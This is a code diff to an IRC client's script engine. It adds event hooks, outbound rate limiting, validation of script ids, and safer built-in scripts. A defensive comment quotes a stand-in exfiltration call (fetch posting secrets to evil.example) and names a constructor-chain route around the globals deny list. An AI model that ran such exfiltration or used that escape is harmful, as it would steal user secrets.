@@ -4,8 +4,36 @@
  */
 
 import AsyncStorage from '@react-native-async-storage/async-storage';
-import { IRCMessage } from './IRCService';
+import type { IRCMessage } from './IRCService';
+import type { ChannelTab } from '../types';
 import { connectionManager } from './ConnectionManager';
+import { addonIALService } from './scripting/AddonIALService';
+import {
+  addonChannelKnowledge,
+  MASK_LIST_KINDS,
+  type MaskListKind,
+} from './scripting/AddonChannelKnowledge';
+import { addonServerKnowledge } from './scripting/AddonServerKnowledge';
+import { addonDiagnostics } from './scripting/AddonDiagnostics';
+import {
+  addonTableStore,
+  type BatchOperation,
+  type QueryOptions,
+  type TableValue,
+} from './scripting/AddonTableStore';
+import { addonSecretStore } from './scripting/AddonSecretStore';
+import { addonSignalBus } from './scripting/AddonSignalBus';
+import { addonWorkspace } from './scripting/AddonWorkspace';
+import {
+  formatCsv,
+  formatIni,
+  formatLines,
+  parseCsv,
+  parseIni,
+  parseJson,
+  parseLines,
+} from './scripting/AddonFileFormats';
+import { matchesHostmask } from './scripting/AddonUserMask';
 import { logger } from './Logger';
 import { adRewardService } from './AdRewardService';
 import { tx } from '../i18n/localization';
@@ -34,11 +62,40 @@ import { aiService } from './ai/AIService';
 import { AIError } from './ai/types';
 import { SoundEventType } from '../types/sound';
 import { Alert, Linking } from 'react-native';
+import { dccFileService, type DCCFileTransfer } from './DCCFileService';
 
 import { APP_VERSION } from '../config/appVersion';
+import {
+  addonEventFromIrcMessage,
+  createAddonEventEnvelope,
+  type AddonEventEnvelope,
+} from './scripting/AddonEventEnvelope';
+import { parseAddonModeChanges } from './scripting/AddonModeParser';
+import {
+  appLifecycleEventService,
+  type AddonAppState,
+} from './scripting/AppLifecycleEventService';
+import {
+  addonEventRouter,
+  type AddonEventPreviewResult,
+  type AddonEventRouteResult,
+} from './scripting/AddonEventRouter';
 
 /* eslint-disable no-useless-escape -- Script examples and regex literals intentionally use escaped character classes. */
 type HookResult = void | string | { command?: string; cancel?: boolean };
+type NumericHookResult = void | boolean;
+
+export interface ScriptInputContext {
+  channel?: string;
+  networkId?: string;
+  tabId?: string;
+  tabType?: 'channel' | 'query' | 'server' | 'notice' | 'dcc';
+}
+
+export interface ScriptCompletion {
+  text: string;
+  description?: string;
+}
 
 const t = (key: string, params?: Record<string, unknown>) => tx.t(key, params);
 
@@ -88,6 +145,33 @@ interface ScriptHooks {
     target: string | undefined,
     message: IRCMessage,
   ) => void;
+  onBan?: ModeTargetHook;
+  onUnban?: ModeTargetHook;
+  onOp?: ModeTargetHook;
+  onDeop?: ModeTargetHook;
+  onVoice?: ModeTargetHook;
+  onDevoice?: ModeTargetHook;
+  onHelp?: ModeTargetHook;
+  onDehelp?: ModeTargetHook;
+  onUserMode?: (
+    target: string,
+    setter: string,
+    mode: string,
+    message: IRCMessage,
+  ) => void;
+  onServerMode?: (
+    target: string,
+    setter: string,
+    mode: string,
+    message: IRCMessage,
+  ) => void;
+  onServerNotice?: (from: string, text: string, message: IRCMessage) => void;
+  onWallops?: (from: string, text: string, message: IRCMessage) => void;
+  onServerError?: (text: string, message: IRCMessage) => void;
+  onPing?: (token: string, direction: 'in' | 'out') => void;
+  onPong?: (token: string, direction: 'in' | 'out') => void;
+  onNotifyOnline?: PresenceHook;
+  onNotifyOffline?: PresenceHook;
   onTopic?: (
     channel: string,
     topic: string,
@@ -118,10 +202,36 @@ interface ScriptHooks {
    * rather than intercepted.
    */
   onRaw?: (line: string, direction: 'in' | 'out', message?: IRCMessage) => void;
+  /** A parsed server numeric. Return false to hide only its default display. */
+  onNumeric?: (
+    code: number,
+    params: string[],
+    text: string,
+    message: IRCMessage,
+  ) => NumericHookResult;
+  onTabOpen?: (tab: ChannelTab) => void;
+  onTabClose?: (tab: ChannelTab) => void;
+  onFileSent?: (transfer: DCCFileTransfer) => void;
+  onFileReceived?: (transfer: DCCFileTransfer) => void;
+  onDccSendFailed?: (transfer: DCCFileTransfer) => void;
+  onDccReceiveFailed?: (transfer: DCCFileTransfer) => void;
+  onTabActivate?: (
+    previous: ChannelTab | undefined,
+    current: ChannelTab | undefined,
+  ) => void;
+  onAppStateChange?: (state: 'active' | 'background' | 'inactive') => void;
+  onLoad?: () => void;
+  onStart?: () => void;
   onCommand?: (
     text: string,
     ctx: { channel?: string; networkId?: string },
   ) => HookResult;
+  onInput?: (text: string, context: ScriptInputContext) => HookResult;
+  onTabComplete?: (
+    text: string,
+    cursor: number,
+    context: ScriptInputContext,
+  ) => string | ScriptCompletion | Array<string | ScriptCompletion> | void;
   onTimer?: (name: string) => void;
   /**
    * The script is being switched off or replaced. Last chance to do anything.
@@ -132,7 +242,31 @@ interface ScriptHooks {
    * on its way out and nothing will be waiting for a promise.
    */
   onUnload?: () => void;
+  /**
+   * A signal another script raised. Delivered synchronously; a broadcast never
+   * comes back to the script that sent it.
+   */
+  onSignal?: (signal: {
+    name: string;
+    payload: unknown;
+    from: string;
+    scope: 'self' | 'addon' | 'broadcast';
+  }) => void;
 }
+
+type ModeTargetHook = (
+  channel: string,
+  setter: string,
+  target: string,
+  message: IRCMessage,
+) => void;
+
+type PresenceHook = (
+  nick: string,
+  user: string,
+  host: string,
+  message: IRCMessage,
+) => void;
 
 /** Context passed to script-registered /commands and menu actions. */
 export interface ScriptCommandContext {
@@ -167,6 +301,55 @@ interface ScriptSettings {
   loggingEnabled: boolean;
 }
 
+/** Ids are namespaces: no ':', no '/', no '..'. See add(). */
+/**
+ * Names shadowed inside every compiled script.
+ *
+ * A script body compiled with `new Function` runs in global scope, so `fetch`,
+ * `global`, `globalThis` and `process` were simply *there* — which made the
+ * web allowlist decorative for anyone who knew it:
+ *
+ *     fetch('https://evil.example/collect', { method: 'POST', body: secrets })
+ *
+ * Passing these as parameters and never supplying them makes each one
+ * `undefined` inside the body, so the obvious path is closed and `api.http`
+ * becomes the only network a script has.
+ *
+ * **This is not a sandbox and must not be described as one.** A determined
+ * author still reaches the real global object through a constructor chain
+ * (`({}).constructor.constructor`), and that cannot be closed from inside the
+ * same realm. Closing it properly is what the isolated QuickJS runtime does
+ * for imported packages; legacy scripts are code the user wrote or pasted,
+ * and this raises the bar rather than removing the risk.
+ *
+ * `eval` is deliberately absent: a parameter named `eval` is a SyntaxError in
+ * strict mode, so it cannot be shadowed this way.
+ */
+const SHADOWED_GLOBALS = [
+  'fetch',
+  'XMLHttpRequest',
+  'WebSocket',
+  'global',
+  'globalThis',
+  'process',
+  'require',
+  'importScripts',
+  'Function',
+] as const;
+
+const SAFE_SCRIPT_ID = /^[A-Za-z0-9][A-Za-z0-9._-]{0,99}$/;
+
+/** A hook taking this long has blocked every other thing the app wanted to do. */
+const SLOW_HOOK_MS = 2000;
+/** Slow runs before a script is switched off. */
+const SLOW_HOOK_LIMIT = 3;
+
+/** Outbound burst one script may spend at once, then 10 a second after that. */
+const SEND_BURST = 60;
+const SEND_PER_SECOND = 10;
+/** Dropped lines before the script is switched off entirely. */
+const SEND_DROP_LIMIT = 200;
+
 class ScriptingService {
   private scripts: CompiledScript[] = [];
   private initialized = false;
@@ -181,14 +364,31 @@ class ScriptingService {
     {
       scriptId: string;
       handler: (args: string[], ctx: ScriptCommandContext) => HookResult;
+      /** Shown in autocomplete. Optional, because older scripts pass none. */
+      description?: string;
     }
   > = new Map();
+  private slowHookCounts = new Map<string, number>();
+  private sendBudgets = new Map<
+    string,
+    { tokens: number; refilledAt: number; dropped: number }
+  >();
   private scriptMenuItems: ScriptMenuItem[] = [];
   private menuItemSeq = 0;
   // Abuse limits for the media/link helpers (shared across all scripts).
   private lastSoundAt = 0;
   private lastNotifyAt = 0;
   private lastLinkAt = 0;
+  private unsubscribeTabEvents?: () => void;
+  private unsubscribeDccEvents?: () => void;
+  private unsubscribeAppLifecycle?: () => void;
+  private completedDccTransfers = new Set<string>();
+  private failedDccTransfers = new Set<string>();
+  private dccDisplayRoutes = new Map<string, Promise<AddonEventRouteResult>>();
+  private addonEventListeners = new Set<
+    (event: Readonly<AddonEventEnvelope>) => void
+  >();
+  private addonEventSequence = 0;
 
   async initialize() {
     if (this.initialized) return;
@@ -198,8 +398,180 @@ class ScriptingService {
     await adRewardService.initialize();
     this.repository = this.getBuiltInScripts();
     await this.ensureBuiltInsInstalled();
+    this.subscribeLifecycleHooks();
     this.updateUsageTracking(); // Ensure usage timer starts if scripts were previously enabled
     this.initialized = true;
+    this.runHook('onStart', hooks => hooks.onStart?.());
+  }
+
+  private subscribeLifecycleHooks(): void {
+    this.unsubscribeTabEvents?.();
+    this.unsubscribeDccEvents?.();
+    this.unsubscribeAppLifecycle?.();
+    this.unsubscribeAppLifecycle = appLifecycleEventService.subscribe(state =>
+      this.handleAppStateChange(state),
+    );
+
+    this.unsubscribeTabEvents = useTabStore.subscribe((state, previous) => {
+      const previousById = new Map(previous.tabs.map(tab => [tab.id, tab]));
+      const currentIds = new Set(state.tabs.map(tab => tab.id));
+
+      state.tabs.forEach(tab => {
+        if (!previousById.has(tab.id)) {
+          this.emitAddonEvent(
+            createAddonEventEnvelope({
+              id: this.nextAddonEventId('tab-open'),
+              type: 'app.tab-open',
+              network: tab.networkId,
+              target: tab.name,
+              payload: {
+                id: tab.id,
+                name: tab.name,
+                type: tab.type,
+                hasActivity: tab.hasActivity === true,
+                isEncrypted: tab.isEncrypted === true,
+              },
+            }),
+          );
+          this.runHook('onTabOpen', hooks => hooks.onTabOpen?.(tab));
+        }
+      });
+      previous.tabs.forEach(tab => {
+        if (!currentIds.has(tab.id)) {
+          this.emitAddonEvent(
+            createAddonEventEnvelope({
+              id: this.nextAddonEventId('tab-close'),
+              type: 'app.tab-close',
+              network: tab.networkId,
+              target: tab.name,
+              payload: { id: tab.id, name: tab.name, type: tab.type },
+            }),
+          );
+          this.runHook('onTabClose', hooks => hooks.onTabClose?.(tab));
+        }
+      });
+      if (state.activeTabId !== previous.activeTabId) {
+        const previousTab = previous.tabs.find(
+          tab => tab.id === previous.activeTabId,
+        );
+        const currentTab = state.tabs.find(tab => tab.id === state.activeTabId);
+        this.emitAddonEvent(
+          createAddonEventEnvelope({
+            id: this.nextAddonEventId('tab-activate'),
+            type: 'app.tab-activate',
+            network: currentTab?.networkId ?? previousTab?.networkId,
+            target: currentTab?.name,
+            payload: {
+              previous: previousTab
+                ? {
+                    id: previousTab.id,
+                    name: previousTab.name,
+                    type: previousTab.type,
+                  }
+                : null,
+              current: currentTab
+                ? {
+                    id: currentTab.id,
+                    name: currentTab.name,
+                    type: currentTab.type,
+                  }
+                : null,
+            },
+          }),
+        );
+        this.runHook('onTabActivate', hooks =>
+          hooks.onTabActivate?.(previousTab, currentTab),
+        );
+      }
+    });
+
+    this.completedDccTransfers.clear();
+    this.failedDccTransfers.clear();
+    this.dccDisplayRoutes.clear();
+    this.unsubscribeDccEvents = dccFileService.onTransferUpdate(transfer => {
+      if (transfer.status === 'failed') {
+        if (this.failedDccTransfers.has(transfer.id)) return;
+        this.failedDccTransfers.add(transfer.id);
+        this.routeDccDisplay(transfer);
+        if (transfer.direction === 'outgoing') {
+          this.runHook('onDccSendFailed', hooks =>
+            hooks.onDccSendFailed?.(transfer),
+          );
+        } else {
+          this.runHook('onDccReceiveFailed', hooks =>
+            hooks.onDccReceiveFailed?.(transfer),
+          );
+        }
+        return;
+      }
+      if (transfer.status !== 'completed') return;
+      if (this.completedDccTransfers.has(transfer.id)) return;
+      this.completedDccTransfers.add(transfer.id);
+      this.routeDccDisplay(transfer);
+      if (transfer.direction === 'outgoing') {
+        this.runHook('onFileSent', hooks => hooks.onFileSent?.(transfer));
+      } else {
+        this.runHook('onFileReceived', hooks =>
+          hooks.onFileReceived?.(transfer),
+        );
+      }
+    });
+  }
+
+  /**
+   * Returns the one shared route for a terminal DCC status. Both lifecycle
+   * hooks and the UI notification consumer call this, so one transfer update
+   * cannot execute imported addon handlers twice.
+   */
+  handleDccDisplay(transfer: DCCFileTransfer): Promise<AddonEventRouteResult> {
+    if (transfer.status !== 'completed' && transfer.status !== 'failed') {
+      return Promise.resolve({
+        delivered: 0,
+        failed: 0,
+        hideDefaultRequestedBy: [],
+        transformations: [],
+      });
+    }
+    return this.routeDccDisplay(transfer);
+  }
+
+  private routeDccDisplay(
+    transfer: DCCFileTransfer,
+  ): Promise<AddonEventRouteResult> {
+    const key = `${transfer.id}:${transfer.status}`;
+    const existing = this.dccDisplayRoutes.get(key);
+    if (existing) return existing;
+    const failed = transfer.status === 'failed';
+    const route = this.emitAddonEvent(
+      createAddonEventEnvelope({
+        id: this.nextAddonEventId(failed ? 'file-failed' : 'file-complete'),
+        type: failed
+          ? transfer.direction === 'outgoing'
+            ? 'transfer.file-send-failed'
+            : 'transfer.file-receive-failed'
+          : transfer.direction === 'outgoing'
+            ? 'transfer.file-sent'
+            : 'transfer.file-received',
+        network: transfer.networkId,
+        target: transfer.peerNick,
+        payload: {
+          transferId: transfer.id,
+          peerNick: transfer.peerNick ?? '',
+          filename: transfer.offer?.filename ?? 'unknown',
+          size: transfer.size ?? transfer.offer?.size ?? null,
+          bytesReceived: transfer.bytesReceived ?? 0,
+          direction: transfer.direction,
+          status: transfer.status,
+          error: transfer.error ?? null,
+        },
+      }),
+    );
+    this.dccDisplayRoutes.set(key, route);
+    if (this.dccDisplayRoutes.size > 256) {
+      const oldest = this.dccDisplayRoutes.keys().next().value;
+      if (oldest) this.dccDisplayRoutes.delete(oldest);
+    }
+    return route;
   }
 
   async load() {
@@ -302,6 +674,7 @@ class ScriptingService {
       // eslint-disable-next-line no-new-func
       const factory = new Function(
         'api',
+        ...SHADOWED_GLOBALS,
         `
         "use strict";
         const exports = {};
@@ -328,10 +701,26 @@ class ScriptingService {
   }
 
   async add(script: ScriptConfig) {
+    // The id is a namespace, not a label. It prefixes AsyncStorage keys and
+    // timer ids that are matched with startsWith, and `api.files` turns it
+    // into a directory name. An id containing ':' would let one script list
+    // and clear another's storage; one containing '/' or '..' would put its
+    // "private" directory somewhere else entirely. Nothing supplies a crafted
+    // id today - every path generates one - but that is a property of the
+    // callers, not of this boundary, and it should not have to stay true.
+    if (typeof script?.id !== 'string' || !SAFE_SCRIPT_ID.test(script.id))
+      throw new Error(`Script id "${script?.id}" is not a safe namespace.`);
     this.scripts = this.scripts.filter(s => s.id !== script.id);
     const withDefault = { ...script, enabled: script.enabled ?? false };
     this.scripts.push(this.compile(withDefault as ScriptConfig));
     await this.save();
+    const installed = this.scripts.find(entry => entry.id === script.id);
+    if (installed?.enabled && installed.hooks?.onLoad) {
+      this.runSingleLifecycleHook(installed, 'onLoad');
+    }
+    if (installed?.enabled && installed.hooks?.onStart) {
+      this.runSingleLifecycleHook(installed, 'onStart');
+    }
   }
 
   async remove(id: string) {
@@ -373,6 +762,11 @@ class ScriptingService {
     });
     await this.save();
 
+    if (enabled) {
+      const started = this.scripts.find(entry => entry.id === id);
+      if (started) this.runSingleLifecycleHook(started, 'onStart');
+    }
+
     // Start/stop usage tracking based on enabled scripts
     this.updateUsageTracking();
   }
@@ -407,17 +801,50 @@ class ScriptingService {
     return [
       {
         id: 'builtin-autoop',
-        name: t('Auto-Op'),
+        name: t('Auto-Op (by account)'),
         enabled: false,
-        description: t('Ops everyone who joins the channel.'),
+        description: t(
+          'Ops people whose registered account is on your list. Never ops by nick alone.',
+        ),
         builtIn: true,
+        // Account first, certificate fingerprint second, nick never. A nick is
+        // free to take the moment its owner disconnects, so an auto-op keyed on
+        // one hands operator status to whoever gets there first. The account is
+        // what the network actually verified.
         code: `
           module.exports = {
             onJoin: (channel, nick, msg) => {
-              if (nick === msg?.from && msg?.from === api?.userNick) return;
-              if (channel && nick && api?.sendCommand) {
-                api.sendCommand('MODE ' + channel + ' +o ' + nick, msg?.network);
+              if (!channel || !nick || nick === api.userNick) return;
+
+              var trusted = api.store.table('trusted');
+              var who = api.users.get(nick, msg && msg.network);
+              if (!who) return;
+
+              // A null account means the server said "logged out", which is
+              // exactly when we must not act.
+              var byAccount = who.account
+                ? trusted.get('account:' + who.account.toLowerCase())
+                : undefined;
+              var byCertfp = who.certfp
+                ? trusted.get('certfp:' + who.certfp.toLowerCase())
+                : undefined;
+              if (!byAccount && !byCertfp) return;
+
+              api.sendCommand('MODE ' + channel + ' +o ' + nick, msg && msg.network);
+            },
+
+            // /trustop <account>  -  add someone to the list
+            onCommand: (text) => {
+              var parts = String(text || '').split(' ');
+              if (parts[0] !== '/trustop') return;
+              var account = (parts[1] || '').trim().toLowerCase();
+              if (!account) {
+                api.echo(null, 'Usage: /trustop <account name>');
+                return false;
               }
+              api.store.table('trusted').set('account:' + account, true);
+              api.echo(null, 'Will op ' + account + ' when they join.');
+              return false;
             }
           };
         `,
@@ -472,17 +899,101 @@ class ScriptingService {
         `,
       },
       {
-        id: 'builtin-autovoice',
-        name: t('Auto-Voice'),
+        id: 'builtin-who-is-this',
+        name: t('Who is this?'),
         enabled: false,
-        description: t('Automatically voices users when they join.'),
+        description: t(
+          'Type /whois2 <nick> for what the app already knows, with no server request.',
+        ),
         builtIn: true,
+        // Everything here is a cache read. The point of the example is that
+        // answering "who is this" usually needs no WHOIS at all, and a script
+        // that fires one per message is how a client gets throttled.
+        code: `
+          module.exports = {
+            onCommand: (text) => {
+              var parts = String(text || '').split(' ');
+              if (parts[0] !== '/whois2') return;
+              var nick = (parts[1] || '').trim();
+              if (!nick) { api.echo(null, 'Usage: /whois2 <nick>'); return false; }
+
+              var who = api.users.get(nick);
+              if (!who) { api.echo(null, 'Nothing known about ' + nick + '.'); return false; }
+
+              api.echo(null, who.nick + ' (' + (who.ident || '?') + '@' + (who.host || '?') + ')');
+              api.echo(null, '  account: ' + (who.account === null ? 'logged out' : (who.account || 'unknown')));
+              api.echo(null, '  shared channels: ' + (who.channels.join(', ') || 'none'));
+              if (who.provenance && who.provenance.host) {
+                api.echo(null, '  host known from: ' + who.provenance.host.source);
+              }
+              return false;
+            }
+          };
+        `,
+      },
+      {
+        id: 'builtin-channel-notes',
+        name: t('Channel Notes'),
+        enabled: false,
+        description: t(
+          'Keeps a note file per channel. /note <text> to add, /notes to read back.',
+        ),
+        builtIn: true,
+        // Shows the workspace and the line parser together. Paths are relative
+        // and the script cannot name a file outside its own directory.
+        code: `
+          module.exports = {
+            onCommand: (text, ctx) => {
+              var parts = String(text || '').split(' ');
+              var channel = ctx && ctx.target;
+              if (!channel) return;
+              var file = 'notes/' + channel.replace(/[^a-zA-Z0-9]/g, '_') + '.txt';
+
+              if (parts[0] === '/note') {
+                var note = parts.slice(1).join(' ').trim();
+                if (!note) { api.echo(channel, 'Usage: /note <text>'); return false; }
+                api.files.read(file).then(function (existing) {
+                  var lines = api.parse.lines(existing.ok ? existing.value : '');
+                  lines.push(new Date().toISOString().slice(0, 10) + '  ' + note);
+                  return api.files.write(file, api.format.lines(lines));
+                }).then(function (written) {
+                  api.echo(channel, written && written.ok
+                    ? 'Note saved.'
+                    : 'Could not save the note: ' + (written && written.reason));
+                });
+                return false;
+              }
+
+              if (parts[0] === '/notes') {
+                api.files.read(file).then(function (existing) {
+                  var lines = api.parse.lines(existing.ok ? existing.value : '');
+                  if (lines.length === 0) { api.echo(channel, 'No notes yet.'); return; }
+                  lines.forEach(function (line) { api.echo(channel, line); });
+                });
+                return false;
+              }
+            }
+          };
+        `,
+      },
+      {
+        id: 'builtin-autovoice',
+        name: t('Auto-Voice (registered users)'),
+        enabled: false,
+        description: t(
+          'Voices people who are logged in to a network account. Ignores unregistered nicks.',
+        ),
+        builtIn: true,
+        // Voice is a much smaller grant than op, so "any registered account" is
+        // a reasonable rule where it would not be for +o. It still asks the
+        // network who someone is rather than trusting the nick.
         code: `
           module.exports = {
             onJoin: (channel, nick, msg) => {
-              if (!channel || !nick) return;
-              if (nick === api?.userNick) return;
-              api.sendCommand('MODE ' + channel + ' +v ' + nick, msg?.network);
+              if (!channel || !nick || nick === api.userNick) return;
+              var who = api.users.get(nick, msg && msg.network);
+              if (!who || typeof who.account !== 'string') return;
+              api.sendCommand('MODE ' + channel + ' +v ' + nick, msg && msg.network);
             }
           };
         `,
@@ -784,15 +1295,19 @@ class ScriptingService {
           'Automatically bookmarks channels you frequently visit.',
         ),
         builtIn: true,
+        // One table keyed by channel, rather than a key per channel glued
+        // together by hand: a table can be listed, queried and cleaned up,
+        // which a pile of 'visitCount_#chan' keys cannot.
         code: `
           module.exports = {
             onJoin: async (channel, nick) => {
               if (!channel || nick !== api.userNick) return;
-              const visitCount = await api.getStorage('visitCount_' + channel) || 0;
-              await api.setStorage('visitCount_' + channel, visitCount + 1);
-              if (visitCount >= 5 && !(await api.isChannelBookmarked(channel))) {
-                // Auto-bookmark after 5 visits
-                api.log('Auto-bookmarking ' + channel + ' after ' + (visitCount + 1) + ' visits');
+              const visits = await api.store.table('visits').increment(channel);
+              if (!visits.ok) return;
+              if (visits.value === 5 && !(await api.isChannelBookmarked(channel))) {
+                // Exactly 5, not 5-or-more: otherwise this fires on every
+                // join for the rest of the channel's life.
+                api.log('You have joined ' + channel + ' five times - worth bookmarking?');
               }
             }
           };
@@ -1084,21 +1599,26 @@ class ScriptingService {
         enabled: false,
         description: t('Demonstrates using script storage to persist data.'),
         builtIn: true,
+        // The counter uses increment() rather than read-add-write. Reading a
+        // value, adding one and writing it back is not atomic across an await:
+        // two messages arriving together both read the same number and one of
+        // them is lost. This is the example people copy to learn storage, so
+        // it has to teach the version that survives contact with traffic.
         code: `
           module.exports = {
-            onConnect: async (networkId) => {
-              const lastConnect = await api.getStorage('lastConnect');
-              if (lastConnect) {
-                api.log('Last connected: ' + new Date(lastConnect).toLocaleString());
+            onConnect: async () => {
+              const meta = api.store.table('meta');
+              const last = meta.get('lastConnect');
+              if (last) {
+                api.log('Last connected: ' + new Date(last).toLocaleString());
               }
-              await api.setStorage('lastConnect', api.now());
+              await meta.set('lastConnect', api.now());
             },
             onMessage: async (msg) => {
-              if (!msg?.from) return;
-              const msgCount = await api.getStorage('messageCount') || 0;
-              await api.setStorage('messageCount', msgCount + 1);
-              if ((msgCount + 1) % 100 === 0) {
-                api.log('Processed ' + (msgCount + 1) + ' messages');
+              if (!msg || !msg.from) return;
+              const result = await api.store.table('meta').increment('messages');
+              if (result.ok && result.value % 100 === 0) {
+                api.log('Processed ' + result.value + ' messages');
               }
             }
           };
@@ -1207,19 +1727,27 @@ class ScriptingService {
           'Adds /opall command that ops every non-op user in the channel.',
         ),
         builtIn: true,
+        // Asks the address list who holds which mode instead of stripping
+        // prefix characters off a name. The prefixes are not fixed: `~` is an
+        // owner on one network and nothing on another, and a hardcoded
+        // `[+%~&]` gets it wrong on the ones it has not heard of. `channelModes`
+        // comes from the server's own PREFIX token.
         code: `
           // Registered at load time; type /opall in a channel to run it.
-          api.registerCommand('opall', (args, ctx) => {
-            if (!ctx.channel) return;
-            const users = api.getChannelUsers(ctx.channel, ctx.networkId);
-            users.forEach(u => {
-              if (u.startsWith('@')) return; // already an op
-              const nick = u.replace(/^[+%~&]/, '');
-              if (nick && nick !== api.userNick) {
-                api.op(ctx.channel, nick, ctx.networkId);
-              }
-            });
-          });
+          api.registerCommand(
+            'opall',
+            (args, ctx) => {
+              if (!ctx.channel) return;
+              const members = api.users.onChannel(ctx.channel, ctx.networkId);
+              members.forEach(member => {
+                const modes = member.channelModes[ctx.channel] || [];
+                if (modes.indexOf('o') !== -1) return; // already an op
+                if (member.nick === api.userNick) return;
+                api.op(ctx.channel, member.nick, ctx.networkId);
+              });
+            },
+            'Ops everyone in the channel who is not already an op',
+          );
           module.exports = {};
         `,
       },
@@ -1540,9 +2068,11 @@ class ScriptingService {
           api.registerCommand('tr', async (args, ctx) => {
             if (!ctx || !ctx.channel) return;
             const on = (args[0] || '').toLowerCase() === 'on';
-            const channels = (await api.getStorage('channels')) || {};
-            channels[ctx.channel] = on;
-            await api.setStorage('channels', channels);
+            // One row per channel rather than one object holding all of them:
+            // reading the whole object, editing it and writing it back loses a
+            // change if two channels are switched at once, and it cannot be
+            // listed or cleaned up.
+            await api.store.table('translating').set(ctx.channel, on);
             // A notice rather than only the log: a switch you flip should
             // answer you where you flipped it.
             api.sendNotice(
@@ -1558,8 +2088,7 @@ class ScriptingService {
               // Never react to your own output — this is what stops two bots
               // in one channel from answering each other forever.
               if (msg.from === api.userNick) return;
-              const channels = (await api.getStorage('channels')) || {};
-              if (!channels[msg.channel]) return;
+              if (!api.store.table('translating').get(msg.channel)) return;
               const translated = await api.ai.ask(msg.text, {
                 system: 'Translate to English. Reply with the translation only. If it is already English, reply with exactly SKIP.',
                 maxTokens: 200,
@@ -1668,6 +2197,74 @@ class ScriptingService {
     }
   }
 
+  /**
+   * One signal, to the scripts here and to any imported addon listening.
+   *
+   * The bus owns the payload, depth and rate rules, so both kinds of receiver
+   * are bound by the same limits; this only fans the result out to script
+   * hooks, which the bus knows nothing about. A broadcast is not delivered
+   * back to its sender - a script handling its own broadcast is the first half
+   * of every loop anyone writes.
+   */
+  private dispatchSignal(
+    fromScriptId: string,
+    name: string,
+    payload: unknown,
+    target?: string,
+  ) {
+    const result = addonSignalBus.send(fromScriptId, name, payload, target);
+    if (result.failed) return result;
+
+    let delivered = result.delivered;
+    const scope: 'self' | 'addon' | 'broadcast' =
+      target === fromScriptId ? 'self' : target ? 'addon' : 'broadcast';
+
+    for (const script of this.scripts as CompiledScript[]) {
+      if (!script.enabled || !script.hooks?.onSignal) continue;
+      if (target ? script.id !== target : script.id === fromScriptId) continue;
+      try {
+        script.hooks.onSignal({
+          name,
+          payload:
+            payload === null ? null : JSON.parse(JSON.stringify(payload)),
+          from: fromScriptId,
+          scope,
+        });
+        delivered += 1;
+      } catch (error) {
+        this.addLog({
+          level: 'warn',
+          message: `onSignal failed: ${String(error)}`,
+          scriptId: script.id,
+        });
+      }
+    }
+    return { ...result, delivered };
+  }
+
+  /**
+   * Commands scripts have registered, for the composer's suggestion list.
+   *
+   * These already worked when typed in full; they were simply invisible,
+   * because the composer built its list from a hardcoded array and never asked
+   * anyone what else existed. A command you cannot discover is a command most
+   * people never use.
+   */
+  listScriptCommands(): Array<{
+    name: string;
+    description?: string;
+    scriptId: string;
+    scriptName?: string;
+  }> {
+    return [...this.scriptCommands.entries()].map(([name, entry]) => ({
+      name,
+      description: entry.description,
+      scriptId: entry.scriptId,
+      scriptName: this.scripts.find(script => script.id === entry.scriptId)
+        ?.name,
+    }));
+  }
+
   private clearScriptRegistrations(scriptId: string) {
     for (const [key, val] of this.scriptCommands) {
       if (val.scriptId === scriptId) this.scriptCommands.delete(key);
@@ -1675,9 +2272,16 @@ class ScriptingService {
     this.scriptMenuItems = this.scriptMenuItems.filter(
       m => m.scriptId !== scriptId,
     );
+    // Signals go the same way commands and menu items do, so a recompiled or
+    // disabled script cannot keep receiving through a handler nobody owns.
+    addonSignalBus.clear(scriptId);
   }
 
-  private scriptSendCommand(command: string, networkId?: string) {
+  private scriptSendCommand(
+    command: string,
+    networkId: string | undefined,
+    scriptId: string,
+  ) {
     if (
       typeof command !== 'string' ||
       !command.trim() ||
@@ -1687,9 +2291,75 @@ class ScriptingService {
     }
     const net = this.validateNetworkId(networkId);
     if (!net) return;
+    if (!this.spendSendBudget(scriptId)) return;
     connectionManager
       .getConnection(net)
       ?.ircService.sendCommand(command.trim().substring(0, 500));
+  }
+
+  /**
+   * One script's outbound budget: a token bucket, 60 lines of burst refilling
+   * at 10 a second.
+   *
+   * The outbound sanitiser bounds the *shape* of a line, not the *rate*, and
+   * nothing else did either — a `while` loop calling sendMessage floods the
+   * server and gets the user G-lined by their own client, which is a ban they
+   * did not do anything to earn.
+   *
+   * The numbers are chosen to be invisible to anything legitimate: `/opall` on
+   * a fifty-user channel fits inside the burst, while a runaway loop asking for
+   * thousands a second does not. Dropping is the protection; the log is so the
+   * user can tell a dropped line from a bug in their script.
+   */
+  private spendSendBudget(scriptId: string): boolean {
+    if (!scriptId) return true;
+    const now = Date.now();
+    const bucket = this.sendBudgets.get(scriptId) ?? {
+      tokens: SEND_BURST,
+      refilledAt: now,
+      dropped: 0,
+    };
+    bucket.tokens = Math.min(
+      SEND_BURST,
+      bucket.tokens + ((now - bucket.refilledAt) / 1000) * SEND_PER_SECOND,
+    );
+    bucket.refilledAt = now;
+
+    if (bucket.tokens >= 1) {
+      bucket.tokens -= 1;
+      this.sendBudgets.set(scriptId, bucket);
+      return true;
+    }
+
+    bucket.dropped += 1;
+    this.sendBudgets.set(scriptId, bucket);
+    addonDiagnostics.count(scriptId, 'errors');
+    if (bucket.dropped === 1 || bucket.dropped % 100 === 0) {
+      this.addLog({
+        level: 'warn',
+        message: t(
+          'Script {id} is sending too fast; {count} line(s) were dropped.',
+          { id: scriptId, count: String(bucket.dropped) },
+        ),
+        scriptId,
+      });
+    }
+    if (bucket.dropped >= SEND_DROP_LIMIT) {
+      const script = this.scripts.find(entry => entry.id === scriptId);
+      if (script?.enabled) {
+        script.enabled = false;
+        this.clearScriptRegistrations(scriptId);
+        this.addLog({
+          level: 'error',
+          message: t('Script {name} was disabled for flooding.', {
+            name: script.name,
+          }),
+          scriptId,
+        });
+        this.save().catch(() => {});
+      }
+    }
+    return false;
   }
 
   private compile(script: ScriptConfig): CompiledScript {
@@ -1702,9 +2372,12 @@ class ScriptingService {
     if (!script.enabled) return safeScript;
     try {
       const api = this.makeApi(script);
+      // Only `api` is supplied; every other parameter stays undefined, which
+      // is what shadows the global of the same name inside the body.
       // eslint-disable-next-line no-new-func
       const factory = new Function(
         'api',
+        ...SHADOWED_GLOBALS,
         `
         "use strict";
         const exports = {};
@@ -1841,22 +2514,31 @@ class ScriptingService {
         if (!chan || typeof text !== 'string' || text.length > 500) return;
         const net = this.validateNetworkId(networkId);
         if (!net) return;
+        if (!this.spendSendBudget(script.id)) return;
         const conn = connectionManager.getConnection(net);
